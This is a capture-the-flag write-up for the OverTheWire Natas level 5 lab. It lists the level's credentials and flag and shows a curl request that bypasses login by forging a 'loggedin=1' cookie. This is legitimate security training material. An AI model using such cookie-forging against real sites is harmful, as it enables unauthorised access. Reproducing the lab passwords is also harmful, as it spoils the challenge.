# Natas5

*	user: `natas5`
*	pass: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
*	url: `http://natas5.natas.labs.overthewire.org`
*	flag: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

## Procedure

1.	When accessing the page, the following message is received

		Access disallowed. You are not logged in

	It's common to use cookies to check if a user is logged in. So let's try
	with a sniffer (e.g. Wireshark) if specific cookie is required.

2.	Bingo! When page is accessed, cookie `loggedin=0` is sent. Let's try to
	change it in 1

		$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -b loggedin=1 http://natas5.natas.labs.overthewire.org/
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
		<body>
		<h1>natas5</h1>
		<div id="content">
		Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
		</body>
		</html>

	Seems to work...
